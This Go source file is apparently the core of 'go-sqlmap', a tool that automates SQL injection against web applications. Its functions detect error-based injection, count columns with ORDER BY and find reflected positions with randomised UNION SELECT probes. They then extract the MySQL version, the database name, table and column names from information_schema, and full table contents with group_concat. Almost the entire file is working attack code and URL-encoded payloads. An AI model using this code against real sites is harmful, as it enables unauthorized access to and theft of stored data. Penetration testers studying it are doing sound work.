package core

import (
	"bytes"
	"go-sqlmap/constant"
	"go-sqlmap/log"
	"go-sqlmap/util"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"
)

func DetectErrorBasedSqlInject(url string, method string) (bool, string) {
	for _, v := range constant.SuffixList {
		innerUrl := url + v
		code, _, body := util.Request(method, innerUrl, nil, nil)
		if code != -1 {
			if strings.Contains(strings.ToLower(string(body)),
				strings.ToLower(constant.DetectedKeyword)) {
				log.Info("detected error based sql injection!")
				return true, innerUrl
			}
		}
	}
	log.Info("not detected error based sql injection!")
	os.Exit(-1)
	return false, ""
}

func GetSuffix(target string) string {
	payload := "%20AnD%20'SQLMaP'='SQLMaP'%20--+"
	_, _, defaultBody := util.Request("GET", target, nil, nil)
	for _, v := range constant.SuffixList {
		_, _, body := util.Request("GET", target+v+payload, nil, nil)
		if string(defaultBody) == string(body) {
			return v
		}
	}
	return ""
}

func GetOrderByNum(suffix string, url string) int {
	order := "order%20by"
	for i := 1; ; i++ {
		payload := url + suffix + constant.Space + order +
			constant.Space + strconv.Itoa(i) + constant.Space + constant.Annotator
		code, _, body := util.Request("GET", payload, nil, nil)
		if code != -1 {
			if strings.Contains(string(body), constant.OrderKeyword) {
				return i
			}
		}
	}
}

func GetUnionSelectPos(suffix string, url string, key int) Pos {
	url = url + "0"
	union := "union%20select"
	unionSql := bytes.Buffer{}
	unionSql.WriteString(url + suffix + constant.Space + union + constant.Space)
	rand.Seed(time.Now().UnixNano())
	randMap := make(map[int]int)
	for i := 1; i < key; i++ {
		x := rand.Intn(10000000)
		randMap[i] = x
		unionSql.WriteString(strconv.Itoa(x) + ",")
	}
	r := []rune(unionSql.String())
	res := string(r[:len(r)-1])
	unionPayload := res + constant.Space + constant.Annotator
	code, _, tempBody := util.Request("GET", unionPayload, nil, nil)
	if code != -1 {
	}
	body := string(tempBody)
	pos := Pos{}
	for k, v := range randMap {
		index := strings.Index(body, strconv.Itoa(v))
		if index != -1 {
			pos.Key = k
			pos.StartIndex = index
			return pos
		}
	}
	return pos
}

func GetVersion(pos Pos, suffix string, url string, key int) string {
	url = url + "0"
	version := "union%20select"
	versionSql := bytes.Buffer{}
	versionSql.WriteString(url + suffix + constant.Space + version + constant.Space)
	for i := 1; i < key; i++ {
		versionSql.WriteString("version(),")
	}
	r := []rune(versionSql.String())
	res := string(r[:len(r)-1])
	versionPayload := res + constant.Space + constant.Annotator
	code, _, tempBody := util.Request("GET", versionPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerR := []rune(body)
		innerRes := string(innerR[pos.StartIndex:])
		result := strings.Split(innerRes, "<")[0]
		log.Info("MySQL Version:" + result)
		return result
	}
	return ""
}

func GetDatabase(pos Pos, suffix string, url string, key int) string {
	url = url + "0"
	database := "union%20select"
	databaseSql := bytes.Buffer{}
	databaseSql.WriteString(url + suffix + constant.Space + database + constant.Space)
	for i := 1; i < key; i++ {
		databaseSql.WriteString("database(),")
	}
	r := []rune(databaseSql.String())
	res := string(r[:len(r)-1])
	databasePayload := res + constant.Space + constant.Annotator
	code, _, tempBody := util.Request("GET", databasePayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerR := []rune(body)
		innerRes := string(innerR[pos.StartIndex:])
		result := strings.Split(innerRes, "<")[0]
		log.Info("Current Database:" + result)
		return result
	}
	return ""
}

func GetAllTables(pos Pos, suffix string, url string, key int) string {
	url = url + "0"
	table := "union%20select"
	tableSql := bytes.Buffer{}
	tableSql.WriteString(url + suffix + constant.Space + table + constant.Space)
	for i := 1; i < key; i++ {
		tableSql.WriteString("group_concat(table_name),")
	}
	r := []rune(tableSql.String())
	res := string(r[:len(r)-1])
	fromSql := "from%20information_schema.tables%20where%20table_schema=database()%20"
	tablePayload := res + constant.Space + fromSql + constant.Annotator
	code, _, tempBody := util.Request("GET", tablePayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerR := []rune(body)
		innerRes := string(innerR[pos.StartIndex:])
		result := strings.Split(innerRes, "<")[0]
		log.Info("Tables:" + result)
		return result
	}
	return ""
}

func GetColumns(pos Pos, suffix string, url string, key int, tableName string) string {
	url = url + "0"
	column := "union%20select"
	columnSql := bytes.Buffer{}
	columnSql.WriteString(url + suffix + constant.Space + column + constant.Space)
	for i := 1; i < key; i++ {
		columnSql.WriteString("group_concat(column_name),")
	}
	r := []rune(columnSql.String())
	res := string(r[:len(r)-1])
	fromSql := "from%20information_schema.columns%20where%20table_name='" + tableName +
		"'%20and%20table_schema=database()%20"
	columnPayload := res + constant.Space + fromSql + constant.Annotator
	code, _, tempBody := util.Request("GET", columnPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerR := []rune(body)
		innerRes := string(innerR[pos.StartIndex:])
		result := strings.Split(innerRes, "<")[0]
		log.Info("Columns:" + result)
		return result
	}
	return ""
}

func GetData(pos Pos, suffix string, url string, key int, tableName string, columns []string) {
	url = url + "0"
	data := "union%20select"
	dataSql := bytes.Buffer{}
	dataSql.WriteString(url + suffix + constant.Space + data + constant.Space)
	for i := 1; i < key; i++ {
		prefix := "group_concat("
		for _, v := range columns {
			prefix = prefix + v + ",0x3a,"
		}
		innerR := []rune(prefix)
		innerRes := string(innerR[:len(innerR)-6])
		dataSql.WriteString(innerRes + "),")
	}
	r := []rune(dataSql.String())
	res := string(r[:len(r)-1])
	fromSql := "from%20" + tableName
	columnPayload := res + constant.Space + fromSql + constant.Annotator
	code, _, tempBody := util.Request("GET", columnPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		innerR := []rune(body)
		innerRes := string(innerR[pos.StartIndex:])
		result := strings.Split(innerRes, "<")[0]
		log.Info("Get Data Success")
		var output [][]string
		for _, v := range strings.Split(result, ",") {
			var temp []string
			params := strings.Split(v, ":")
			for _, innerV := range params {
				temp = append(temp, innerV)
			}
			output = append(output, temp)
		}
		util.PrintData(util.ConvertInterfaceArray(columns, output))
	}
}
